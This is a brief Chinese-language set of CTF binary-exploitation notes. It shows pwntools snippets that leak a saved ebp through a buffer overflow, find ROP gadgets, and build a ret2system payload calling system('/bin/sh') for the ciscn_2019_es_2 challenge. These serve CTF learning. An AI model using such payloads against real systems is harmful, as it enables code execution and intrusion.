## 溢出读取ebp值
sendline 发送时\n 会占一个字符 0x4大小发 `sendline 'a'*4` 会发5个字符引发问题。

举例
```c
char s[40]; // [ebp-28h]
read(0, s, 0x30u);


// 要输出 ebp 需要 0x20 个字节这时只要覆盖最后的 00 即可输出 ebp，用send不用sendline
payload1 = b'A' * (0x27) + b'B'
p.send(payload1)  # not sendline
p.recvuntil("B")
original_ebp = u32(p.recv(4))
```
### 填充指定大小
```py
'a'.ljust(268, ' ')
```
## 使用默认的libc

```
elf = ELF("./canary")
libc = elf.libc
```

## find leave asm

```python
leave_ret = elf.search(asm('leave')).__next__()

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
print(hex(pop_rdi))
```


# Stack

## ret2system

```sh
# ciscn_2019_es_2
elf.plt['system'] + p32(0) + binsh_addr  # 是地址不是 "/bin/sh" 字符
payload =p32(0) + p32(elf.plt['system']) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
payload = payload.ljust(0x28, '\x00')
```